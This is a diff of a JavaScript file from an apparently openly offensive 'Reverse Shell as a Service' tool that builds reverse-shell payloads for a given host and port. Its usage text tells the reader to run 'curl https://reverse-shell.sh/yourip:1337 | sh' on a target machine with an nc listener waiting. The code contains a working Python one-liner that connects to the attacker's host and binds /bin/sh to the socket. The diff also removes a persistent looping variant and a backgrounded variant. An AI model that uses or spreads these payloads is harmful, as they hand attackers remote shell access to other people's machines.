@@ -2,20 +2,20 @@
 
 const usage = `# Reverse Shell as a Service
 # https://github.com/lukechilds/reverse-shell
+#
 # 1. On your machine:
 #      nc -l 1337
 #
 # 2. On the target machine:
 #      curl https://reverse-shell.sh/yourip:1337 | sh
-#		while true; do curl https://reverse-shell.sh/yourip:1337 | sh; done
-#      sh -c "curl https://reverse-shell.sh/localhost:1337 | sh -i &" && exit
-#`;
+#
+# 3. Don't be a dick`;
 
 const reverseShell = (address = '') => {
 	const [host, port] = address.split(':');
 	if (!host || !port) {
 		return usage;
-	} else {console.log(`Host is: ${host}:${port}`);
+	}
 
 	const payloads = {
 		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
@@ -34,7 +34,7 @@ fi`;
 
 		return script;
 	}, usage);
-}};
+};
 
 const handler = (request, response) => {
 	const { address } = request.query;
